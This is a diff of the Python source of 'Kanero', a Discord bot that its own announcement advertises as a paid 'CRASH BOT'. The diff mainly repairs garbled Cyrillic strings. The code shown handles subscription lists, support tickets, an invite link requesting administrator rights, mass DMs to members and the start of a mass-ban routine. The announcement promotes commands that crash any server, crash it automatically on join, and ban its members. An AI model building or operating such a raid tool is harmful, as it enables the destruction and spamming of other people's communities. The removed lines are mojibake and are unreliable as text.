-# в”Ђв”Ђв”Ђ FREELIST MANAGEMENT в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- FREELIST MANAGEMENT -----------------------------------
 
 @bot.command(name="fl_add")
 async def fl_add(ctx, *, user_input: str):
-    """Р”РѕР±Р°РІРёС‚СЊ РІ freelist. Р‘РµР· РґРЅРµР№ вЂ” РЅР°РІСЃРµРіРґР°. РЎ РґРЅСЏРјРё вЂ” РІСЂРµРјРµРЅРЅРѕ.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !fl_add @user [РґРЅРё] | !fl_add all [РґРЅРё]
+    """Добавить в freelist. Без дней — навсегда. С днями — временно.
+    Использование: !fl_add @user [дни] | !fl_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
@@ -3416,15 +3416,15 @@ async def fl_add(ctx, *, user_input: str):
         except Exception:
             actual_input = user_input
 
-    # Р РµР¶РёРј ALL
+    # Режим ALL
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
-            await ctx.send("вќЊ Р”РѕРјР°С€РЅРёР№ СЃРµСЂРІРµСЂ РЅРµ РЅР°Р№РґРµРЅ.")
+            await ctx.send("? Домашний сервер не найден.")
             return
-        msg = await ctx.send("вЏі Р’С‹РґР°СЋ Freelist РІСЃРµРј СѓС‡Р°СЃС‚РЅРёРєР°Рј...")
+        msg = await ctx.send("? Выдаю Freelist всем участникам...")
         count = 0
-        user_role = discord.utils.find(lambda r: r.name == "рџ‘Ґ User", home_guild.roles)
+        user_role = discord.utils.find(lambda r: r.name == "?? User", home_guild.roles)
         for member in home_guild.members:
             if member.bot:
                 continue
@@ -3443,28 +3443,28 @@ async def fl_add(ctx, *, user_input: str):
         if not duration_hours:
             save_freelist()
         days = duration_hours // 24 if duration_hours else 0
-        dur_text = f" РЅР° **{days} РґРЅ.**" if duration_hours else " РЅР°РІСЃРµРіРґР°"
-        await msg.edit(content=f"вњ… **Freelist**{dur_text} РІС‹РґР°РЅ **{count}** СѓС‡Р°СЃС‚РЅРёРєР°Рј.")
+        dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
+        await msg.edit(content=f"? **Freelist**{dur_text} выдан **{count}** участникам.")
         return
 
     user = await resolve_user(ctx, actual_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{actual_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{actual_input}` не найден.")
         return
     user_id = user.id
 
     if duration_hours:
         add_temp_subscription(user_id, "fl", duration_hours)
         days = duration_hours // 24
-        duration_text = f"{days} РґРЅ." if days > 0 else f"{duration_hours} С‡."
-        result_text = f"вњ… **{user}** РїРѕР»СѓС‡РёР» **Freelist** РЅР° **{duration_text}** (РІСЂРµРјРµРЅРЅРѕ)."
+        duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
+        result_text = f"? **{user}** получил **Freelist** на **{duration_text}** (временно)."
     else:
         if user_id not in FREELIST:
             FREELIST.append(user_id)
             save_freelist()
-        result_text = f"вњ… **{user}** (`{user_id}`) РґРѕР±Р°РІР»РµРЅ РІ freelist РЅР°РІСЃРµРіРґР°."
+        result_text = f"? **{user}** (`{user_id}`) добавлен в freelist навсегда."
 
-    # Р’С‹РґР°С‘Рј СЂРѕР»СЊ Рё РїРѕСЃС‚РёРј РІ addbot
+    # Выдаём роль и постим в addbot
     try:
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
@@ -3475,30 +3475,30 @@ async def fl_add(ctx, *, user_input: str):
                 except Exception:
                     member = None
             if member:
-                user_role = discord.utils.find(lambda r: r.name == "рџ‘Ґ User", home_guild.roles)
+                user_role = discord.utils.find(lambda r: r.name == "?? User", home_guild.roles)
                 if user_role and user_role not in member.roles:
                     await member.add_roles(user_role, reason="fl_add")
             await update_stats_channels(home_guild)
 
-            # РџРѕСЃС‚РёРј РІ #addbot
+            # Постим в #addbot
             addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), home_guild.text_channels)
             if addbot_ch:
                 app_id = bot.user.id
                 invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
-                days_text = f" РЅР° **{duration_text}**" if duration_hours else ""
+                days_text = f" на **{duration_text}**" if duration_hours else ""
                 notif = discord.Embed(
-                    title="вњ… РќРѕРІС‹Р№ СѓС‡Р°СЃС‚РЅРёРє Freelist",
+                    title="? Новый участник Freelist",
                     description=(
-                        f"{user.mention} РґРѕР±Р°РІР»РµРЅ РІ **Freelist**{days_text}!\n\n"
-                        f"**Р”РѕСЃС‚СѓРїРЅС‹Рµ РєРѕРјР°РЅРґС‹:**\n"
-                        f"`!nuke` В· `!auto_nuke` В· `!help` В· `!changelog`\n\n"
-                        f"**РҐРѕС‡РµС€СЊ Р±РѕР»СЊС€Рµ?**\n"
-                        f"вњ… White / рџ’Ћ Premium вЂ” [РєСѓРїРёС‚СЊ РЅР° FunPay](https://funpay.com/users/16928925/)\n\n"
-                        f"**Р”РѕР±Р°РІРёС‚СЊ Р±РѕС‚Р° РЅР° СЃРµСЂРІРµСЂ:** [РЅР°Р¶РјРё СЃСЋРґР°]({invite_url})"
+                        f"{user.mention} добавлен в **Freelist**{days_text}!\n\n"
+                        f"**Доступные команды:**\n"
+                        f"`!nuke` · `!auto_nuke` · `!help` · `!changelog`\n\n"
+                        f"**Хочешь больше?**\n"
+                        f"? White / ?? Premium — [купить на FunPay](https://funpay.com/users/16928925/)\n\n"
+                        f"**Добавить бота на сервер:** [нажми сюда]({invite_url})"
                     ),
                     color=0x00ff00
                 )
-                notif.set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd")
+                notif.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd")
                 await addbot_ch.send(content=user.mention, embed=notif)
     except Exception:
         pass
@@ -3507,13 +3507,13 @@ async def fl_add(ctx, *, user_input: str):
 
 @bot.command(name="fl_remove")
 async def fl_remove(ctx, *, user_input: str):
-    """РЈР±СЂР°С‚СЊ РёР· freelist. РўРѕР»СЊРєРѕ РґР»СЏ РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°."""
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    """Убрать из freelist. Только для владельца сервера."""
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
     user = await resolve_user(ctx, user_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{user_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{user_input}` не найден.")
         return
     user_id = user.id
     if user_id in FREELIST:
@@ -3524,59 +3524,59 @@ async def fl_remove(ctx, *, user_input: str):
             if home_guild:
                 member = home_guild.get_member(user_id)
                 if member:
-                    user_role = discord.utils.find(lambda r: r.name == "рџ‘Ґ User", home_guild.roles)
+                    user_role = discord.utils.find(lambda r: r.name == "?? User", home_guild.roles)
                     if user_role and user_role in member.roles:
                         await member.remove_roles(user_role, reason="fl_remove")
                 await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"вњ… **{user}** СѓР±СЂР°РЅ РёР· freelist.")
+        await ctx.send(f"? **{user}** убран из freelist.")
     else:
-        await ctx.send("РќРµ РЅР°Р№РґРµРЅ РІ freelist.")
+        await ctx.send("Не найден в freelist.")
 
 
 @bot.command(name="fl_clear")
 async def fl_clear(ctx):
-    """РћС‡РёСЃС‚РёС‚СЊ freelist. РўРѕР»СЊРєРѕ РґР»СЏ РІР»Р°РґРµР»СЊС†Р° СЃРµСЂРІРµСЂР°."""
-    # РўРѕР»СЊРєРѕ РІР»Р°РґРµР»РµС† СЃРµСЂРІРµСЂР° РјРѕР¶РµС‚ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ
+    """Очистить freelist. Только для владельца сервера."""
+    # Только владелец сервера может использовать
     if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
         return
     count = len(FREELIST)
     FREELIST.clear()
     save_freelist()
     embed = discord.Embed(
-        title="рџ—‘пёЏ Freelist РѕС‡РёС‰РµРЅ",
-        description=f"РЈРґР°Р»РµРЅРѕ **{count}** РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№.",
+        title="??? Freelist очищен",
+        description=f"Удалено **{count}** пользователей.",
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ TESTER MANAGEMENT в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- TESTER MANAGEMENT -------------------------------------
 
 @bot.command(name="tester_add")
 async def tester_add(ctx, *, user_input: str):
-    """Р”РѕР±Р°РІРёС‚СЊ С‚РµСЃС‚РµСЂР°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°.
-    РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ: !tester_add @user | !tester_add user_id
+    """Добавить тестера. Только для овнера.
+    Использование: !tester_add @user | !tester_add user_id
     """
     if ctx.author.id != config.OWNER_ID:
         return
 
     user = await resolve_user(ctx, user_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{user_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{user_input}` не найден.")
         return
     
     user_id = user.id
     if user_id in TESTER_LIST:
-        await ctx.send(f"вљ пёЏ **{user}** СѓР¶Рµ РІ СЃРїРёСЃРєРµ С‚РµСЃС‚РµСЂРѕРІ.")
+        await ctx.send(f"?? **{user}** уже в списке тестеров.")
         return
     
     TESTER_LIST.append(user_id)
     save_tester_list()
     
-    # Р’С‹РґР°С‘Рј СЂРѕР»СЊ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Выдаём роль на домашнем сервере
     try:
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
@@ -3587,81 +3587,81 @@ async def tester_add(ctx, *, user_input: str):
                 except Exception:
                     member = None
             if member:
-                tester_role = discord.utils.find(lambda r: r.name == "рџ§Є Tester", home_guild.roles)
+                tester_role = discord.utils.find(lambda r: r.name == "?? Tester", home_guild.roles)
                 if tester_role and tester_role not in member.roles:
                     await member.add_roles(tester_role, reason="tester_add")
     except Exception:
         pass
     
-    await ctx.send(f"вњ… **{user}** (`{user_id}`) РґРѕР±Р°РІР»РµРЅ РІ С‚РµСЃС‚РµСЂС‹.")
+    await ctx.send(f"? **{user}** (`{user_id}`) добавлен в тестеры.")
 
 
 @bot.command(name="tester_remove")
 async def tester_remove(ctx, *, user_input: str):
-    """РЈР±СЂР°С‚СЊ С‚РµСЃС‚РµСЂР°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Убрать тестера. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
 
     user = await resolve_user(ctx, user_input)
     if not user:
-        await ctx.send(f"вќЊ РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ `{user_input}` РЅРµ РЅР°Р№РґРµРЅ.")
+        await ctx.send(f"? Пользователь `{user_input}` не найден.")
         return
     
     user_id = user.id
     if user_id not in TESTER_LIST:
-        await ctx.send(f"вљ пёЏ **{user}** РЅРµ РІ СЃРїРёСЃРєРµ С‚РµСЃС‚РµСЂРѕРІ.")
+        await ctx.send(f"?? **{user}** не в списке тестеров.")
         return
     
     TESTER_LIST.remove(user_id)
     save_tester_list()
     
-    # РЈР±РёСЂР°РµРј СЂРѕР»СЊ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ
+    # Убираем роль на домашнем сервере
     try:
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if home_guild:
             member = home_guild.get_member(user_id)
             if member:
-                tester_role = discord.utils.find(lambda r: r.name == "рџ§Є Tester", home_guild.roles)
+                tester_role = discord.utils.find(lambda r: r.name == "?? Tester", home_guild.roles)
                 if tester_role and tester_role in member.roles:
                     await member.remove_roles(tester_role, reason="tester_remove")
     except Exception:
         pass
     
-    await ctx.send(f"вњ… **{user}** СѓР±СЂР°РЅ РёР· С‚РµСЃС‚РµСЂРѕРІ.")
+    await ctx.send(f"? **{user}** убран из тестеров.")
 
 
 @bot.command(name="tester_list")
 async def tester_list(ctx):
-    """РџРѕРєР°Р·Р°С‚СЊ СЃРїРёСЃРѕРє С‚РµСЃС‚РµСЂРѕРІ. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Показать список тестеров. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
     
     if not TESTER_LIST:
-        await ctx.send("рџ“‹ РЎРїРёСЃРѕРє С‚РµСЃС‚РµСЂРѕРІ РїСѓСЃС‚.")
+        await ctx.send("?? Список тестеров пуст.")
         return
     
     lines = []
     for uid in TESTER_LIST:
         try:
             user = await bot.fetch_user(uid)
-            lines.append(f"`{uid}` вЂ” **{user}**")
+            lines.append(f"`{uid}` — **{user}**")
         except Exception:
-            lines.append(f"`{uid}` вЂ” *РЅРµ РЅР°Р№РґРµРЅ*")
+            lines.append(f"`{uid}` — *не найден*")
     
     embed = discord.Embed(
-        title=f"рџ§Є РўРµСЃС‚РµСЂС‹ ({len(TESTER_LIST)})",
+        title=f"?? Тестеры ({len(TESTER_LIST)})",
         description="\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  !tester_add/@user В· !tester_remove/@user")
+    embed.set_footer(text="?? Kanero  |  !tester_add/@user · !tester_remove/@user")
     await ctx.send(embed=embed)
 
 
-# в”Ђв”Ђв”Ђ РљРћРњРџР•РќРЎРђР¦РРЇ (Р’Р Р•РњР•РќРќР«Р• РџРћР”РџРРЎРљР) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- КОМПЕНСАЦИЯ (ВРЕМЕННЫЕ ПОДПИСКИ) ----------------------
 
-# в”Ђв”Ђв”Ђ TICKET SYSTEM в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
+# --- TICKET SYSTEM -----------------------------------------
 
-TICKET_CATEGORY_NAME = "рџЋ« РўРРљР•РўР«"
+TICKET_CATEGORY_NAME = "?? ТИКЕТЫ"
 open_tickets: dict[int, int] = {}  # user_id -> channel_id
 
 
@@ -3669,7 +3669,7 @@ class TicketCloseView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="рџ”’ Р—Р°РєСЂС‹С‚СЊ С‚РёРєРµС‚", style=discord.ButtonStyle.danger, custom_id="ticket_close")
+    @discord.ui.button(label="?? Закрыть тикет", style=discord.ButtonStyle.danger, custom_id="ticket_close")
     async def close_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
         ch = interaction.channel
         creator_id = None
@@ -3680,9 +3680,9 @@ class TicketCloseView(discord.ui.View):
         if (interaction.user.id != config.OWNER_ID
                 and interaction.user.id not in config.OWNER_WHITELIST
                 and interaction.user.id != creator_id):
-            await interaction.response.send_message("вќЊ РўРѕР»СЊРєРѕ СЃРѕР·РґР°С‚РµР»СЊ РёР»Рё Р°РґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂ РјРѕР¶РµС‚ Р·Р°РєСЂС‹С‚СЊ.", ephemeral=True)
+            await interaction.response.send_message("? Только создатель или администратор может закрыть.", ephemeral=True)
             return
-        await interaction.response.send_message("рџ”’ РўРёРєРµС‚ Р·Р°РєСЂС‹РІР°РµС‚СЃСЏ...")
+        await interaction.response.send_message("?? Тикет закрывается...")
         open_tickets.pop(creator_id, None)
         await ch.delete()
 
@@ -3691,29 +3691,29 @@ class TicketOpenView(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="рџЋ« РЎРѕР·РґР°С‚СЊ С‚РёРєРµС‚", style=discord.ButtonStyle.primary, custom_id="ticket_open")
+    @discord.ui.button(label="?? Создать тикет", style=discord.ButtonStyle.primary, custom_id="ticket_open")
     async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
         guild = interaction.guild
         user = interaction.user
 
-        # РџСЂРѕРІРµСЂСЏРµРј РЅРµС‚ Р»Рё СѓР¶Рµ РѕС‚РєСЂС‹С‚РѕРіРѕ С‚РёРєРµС‚Р°
+        # Проверяем нет ли уже открытого тикета
         if user.id in open_tickets:
             existing = guild.get_channel(open_tickets[user.id])
             if existing:
-                await interaction.response.send_message(f"вќЊ РЈ С‚РµР±СЏ СѓР¶Рµ РµСЃС‚СЊ С‚РёРєРµС‚: {existing.mention}", ephemeral=True)
+                await interaction.response.send_message(f"? У тебя уже есть тикет: {existing.mention}", ephemeral=True)
                 return
             open_tickets.pop(user.id, None)
 
-        # РС‰РµРј РёР»Рё СЃРѕР·РґР°С‘Рј РєР°С‚РµРіРѕСЂРёСЋ С‚РёРєРµС‚РѕРІ
+        # Ищем или создаём категорию тикетов
         category = discord.utils.find(lambda c: TICKET_CATEGORY_NAME in c.name, guild.categories)
         if not category:
-            # РЎРѕР·РґР°РµРј РєР°С‚РµРіРѕСЂРёСЋ СЃ РїСЂР°РІР°РјРё РґР»СЏ РјРѕРґРµСЂР°С‚РѕСЂРѕРІ
+            # Создаем категорию с правами для модераторов
             cat_overwrites = {
                 guild.default_role: discord.PermissionOverwrite(read_messages=False),
             }
-            # Р”РѕР±Р°РІР»СЏРµРј РїСЂР°РІР° РґР»СЏ СЂРѕР»РµР№ РїРѕРґРґРµСЂР¶РєРё
+            # Добавляем права для ролей поддержки
             for r in guild.roles:
-                if r.name in ("рџ‘‘ Owner", "рџ”§ Developer", "рџ¤– Kanero", "рџ›ЎпёЏ Moderator", "рџ§Є Tester"):
+                if r.name in ("?? Owner", "?? Developer", "?? Kanero", "??? Moderator", "?? Tester"):
                     cat_overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
             
             category = await guild.create_category(TICKET_CATEGORY_NAME, overwrites=cat_overwrites)
@@ -3724,50 +3724,50 @@ class TicketOpenView(discord.ui.View):
             guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True, manage_channels=True),
         }
         for r in guild.roles:
-            if r.name in ("рџ‘‘ Owner", "рџ”§ Developer", "рџ¤– Kanero", "рџ›ЎпёЏ Moderator", "рџ§Є Tester"):
+            if r.name in ("?? Owner", "?? Developer", "?? Kanero", "??? Moderator", "?? Tester"):
                 overwrites[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
 
         ticket_ch = await guild.create_text_channel(
             f"ticket-{user.name}",
             category=category,
             overwrites=overwrites,
-            topic=f"РўРёРєРµС‚ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ {user} ({user.id})"
+            topic=f"Тикет пользователя {user} ({user.id})"
         )
         open_tickets[user.id] = ticket_ch.id
 
         embed = discord.Embed(
-            title="рџЋ« РўРёРєРµС‚ СЃРѕР·РґР°РЅ",
+            title="?? Тикет создан",
             description=(
-                f"РџСЂРёРІРµС‚, {user.mention}!\n\n"
-                "РћРїРёС€Рё СЃРІРѕСЋ РїСЂРѕР±Р»РµРјСѓ РёР»Рё РІРѕРїСЂРѕСЃ вЂ” Р°РґРјРёРЅРёСЃС‚СЂР°С†РёСЏ РѕС‚РІРµС‚РёС‚ РєР°Рє РјРѕР¶РЅРѕ СЃРєРѕСЂРµРµ.\n\n"
-                "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ С‡С‚РѕР±С‹ Р·Р°РєСЂС‹С‚СЊ С‚РёРєРµС‚."
+                f"Привет, {user.mention}!\n\n"
+                "Опиши свою проблему или вопрос — администрация ответит как можно скорее.\n\n"
+                "Нажми кнопку ниже чтобы закрыть тикет."
             ),
             color=0x0a0a0a
         )
-        embed.set_footer(text="в пёЏ Kanero  |  РўРёРєРµС‚ Р·Р°РєСЂРѕРµС‚СЃСЏ РїРѕСЃР»Рµ СЂРµС€РµРЅРёСЏ")
+        embed.set_footer(text="?? Kanero  |  Тикет закроется после решения")
         await ticket_ch.send(f"{user.mention}", embed=embed, view=TicketCloseView())
-        await interaction.response.send_message(f"вњ… РўРёРєРµС‚ СЃРѕР·РґР°РЅ: {ticket_ch.mention}", ephemeral=True)
+        await interaction.response.send_message(f"? Тикет создан: {ticket_ch.mention}", ephemeral=True)
 
 
 @bot.command(name="ticket_setup")
 async def ticket_setup(ctx):
-    """РћС‚РїСЂР°РІРёС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ СЃ РєРЅРѕРїРєРѕР№ СЃРѕР·РґР°РЅРёСЏ С‚РёРєРµС‚Р°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Отправить сообщение с кнопкой создания тикета. Только для овнера."""
     if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
         return
     embed = discord.Embed(
-        title="рџЋ« РџРѕРґРґРµСЂР¶РєР° вЂ” Kanero",
+        title="?? Поддержка — Kanero",
         description=(
-            "РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ? Р•СЃС‚СЊ РІРѕРїСЂРѕСЃ?\n\n"
-            "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ вЂ” Р±РѕС‚ СЃРѕР·РґР°СЃС‚ РїСЂРёРІР°С‚РЅС‹Р№ РєР°РЅР°Р» С‚РѕР»СЊРєРѕ РґР»СЏ С‚РµР±СЏ Рё РєРѕРјР°РЅРґС‹ РїРѕРґРґРµСЂР¶РєРё.\n\n"
-            "вЂў Р’РѕРїСЂРѕСЃС‹ РїРѕ Р±РѕС‚Сѓ\n"
-            "вЂў РџРѕРєСѓРїРєР° White / Premium\n"
-            "вЂў Р–Р°Р»РѕР±С‹ Рё РїСЂРµРґР»РѕР¶РµРЅРёСЏ\n\n"
-            "**рџ‘Ґ РљРѕРјР°РЅРґР° РїРѕРґРґРµСЂР¶РєРё:**\n"
-            "рџ‘‘ Owner вЂў рџ”§ Developer вЂў рџ›ЎпёЏ Moderator вЂў рџ§Є Tester"
+            "Нужна помощь? Есть вопрос?\n\n"
+            "Нажми кнопку ниже — бот создаст приватный канал только для тебя и команды поддержки.\n\n"
+            "• Вопросы по боту\n"
+            "• Покупка White / Premium\n"
+            "• Жалобы и предложения\n\n"
+            "**?? Команда поддержки:**\n"
+            "?? Owner • ?? Developer • ??? Moderator • ?? Tester"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РћРґРёРЅ С‚РёРєРµС‚ РЅР° РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ")
+    embed.set_footer(text="?? Kanero  |  Один тикет на пользователя")
     await ctx.send(embed=embed, view=TicketOpenView())
     try:
         await ctx.message.delete()
@@ -3776,20 +3776,20 @@ async def ticket_setup(ctx):
 
 @bot.command(name="goout")
 async def goout(ctx):
-    """Р‘РѕС‚ РїРѕРєРёРґР°РµС‚ СЃРµСЂРІРµСЂ РіРґРµ РЅР°РїРёСЃР°РЅР° РєРѕРјР°РЅРґР°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Бот покидает сервер где написана команда. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
     guild = ctx.guild
     try:
-        await ctx.send("рџ‘‹ Р’С‹С…РѕР¶Сѓ СЃ СЃРµСЂРІРµСЂР°.")
+        await ctx.send("?? Выхожу с сервера.")
         await guild.leave()
     except Exception as e:
-        await ctx.send(f"вќЊ РћС€РёР±РєР°: {e}")
+        await ctx.send(f"? Ошибка: {e}")
 
 
 @bot.command(name="announce")
 async def announce(ctx):
-    """РћС‚РїСЂР°РІРёС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ СЃ РєРЅРѕРїРєРѕР№ РїРѕР»СѓС‡РµРЅРёСЏ РґРѕСЃС‚СѓРїР°. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Отправить сообщение с кнопкой получения доступа. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
 
@@ -3799,29 +3799,29 @@ async def announce(ctx):
             app_id = ctx.bot.user.id
             url = f"https://discord.com/users/{app_id}"
             self.add_item(discord.ui.Button(
-                label="рџ’¬ РќР°РїРёСЃР°С‚СЊ Р±РѕС‚Сѓ РІ Р›РЎ",
+                label="?? Написать боту в ЛС",
                 url=url,
                 style=discord.ButtonStyle.link
             ))
 
     embed = discord.Embed(
-        title="в пёЏ Kanero вЂ” CRASH BOT",
+        title="?? Kanero — CRASH BOT",
         description=(
-            "Р”РѕР±СЂРѕ РїРѕР¶Р°Р»РѕРІР°С‚СЊ!\n\n"
-            "**Р§С‚Рѕ СѓРјРµРµС‚ Р±РѕС‚:**\n"
-            "вЂў `!nuke` вЂ” РєСЂР°С€ Р»СЋР±РѕРіРѕ СЃРµСЂРІРµСЂР°\n"
-            "вЂў `!auto_nuke` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ\n"
-            "вЂў `!super_nuke` вЂ” РЅСЋРє СЃ Р±Р°РЅРѕРј СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "вЂў Р РјРЅРѕРіРѕРµ РґСЂСѓРіРѕРµ...\n\n"
-            "**РљР°Рє РїРѕР»СѓС‡РёС‚СЊ РґРѕСЃС‚СѓРї:**\n"
-            "РќР°Р¶РјРё РєРЅРѕРїРєСѓ РЅРёР¶Рµ в†’ РЅР°РїРёС€Рё Р±РѕС‚Сѓ РІ Р›РЎ `!help`\n\n"
-            "**РџРѕРєР° С‚С‹ РЅР° СЌС‚РѕРј СЃРµСЂРІРµСЂРµ** вЂ” РґРѕСЃС‚СѓРї Рє Р±Р°Р·РѕРІС‹Рј РєРѕРјР°РЅРґР°Рј Р°РєС‚РёРІРµРЅ.\n"
-            "РџСЂРё РІС‹С…РѕРґРµ СЃ СЃРµСЂРІРµСЂР° РґРѕСЃС‚СѓРї СѓРґР°Р»СЏРµС‚СЃСЏ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё.\n\n"
-            "**РљСѓРїРёС‚СЊ РїРѕРґРїРёСЃРєСѓ:** **davaidkatt** | **@Firisotik**"
+            "Добро пожаловать!\n\n"
+            "**Что умеет бот:**\n"
+            "• `!nuke` — краш любого сервера\n"
+            "• `!auto_nuke` — авто-краш при входе\n"
+            "• `!super_nuke` — нюк с баном участников\n"
+            "• И многое другое...\n\n"
+            "**Как получить доступ:**\n"
+            "Нажми кнопку ниже > напиши боту в ЛС `!help`\n\n"
+            "**Пока ты на этом сервере** — доступ к базовым командам активен.\n"
+            "При выходе с сервера доступ удаляется автоматически.\n\n"
+            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РќР°Р¶РјРё РєРЅРѕРїРєСѓ С‡С‚РѕР±С‹ РЅР°С‡Р°С‚СЊ")
+    embed.set_footer(text="?? Kanero  |  Нажми кнопку чтобы начать")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
 
     await ctx.send(embed=embed, view=GetAccessView())
@@ -3841,7 +3841,7 @@ async def massdm(ctx, *, text: str):
     sent = 0
     failed = 0
     status_msg = await ctx.send(embed=discord.Embed(
-        description=f"рџ“Ё Р Р°СЃСЃС‹Р»Р°СЋ Р”Рњ {len(members)} СѓС‡Р°СЃС‚РЅРёРєР°Рј...",
+        description=f"?? Рассылаю ДМ {len(members)} участникам...",
         color=0x0a0a0a
     ))
     for member in members:
@@ -3852,11 +3852,11 @@ async def massdm(ctx, *, text: str):
             failed += 1
         await asyncio.sleep(0.5)
     embed = discord.Embed(
-        title="рџ“Ё Mass DM Р·Р°РІРµСЂС€С‘РЅ",
-        description=f"вњ… РћС‚РїСЂР°РІР»РµРЅРѕ: **{sent}**\nвќЊ РќРµ РґРѕСЃС‚Р°РІР»РµРЅРѕ: **{failed}**",
+        title="?? Mass DM завершён",
+        description=f"? Отправлено: **{sent}**\n? Не доставлено: **{failed}**",
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero")
+    embed.set_footer(text="?? Kanero")
     await status_msg.edit(embed=embed)
 
 
@@ -3871,17 +3871,17 @@ async def massban(ctx):
         and (not m.top_role or m.top_role < bot_role)
     ]
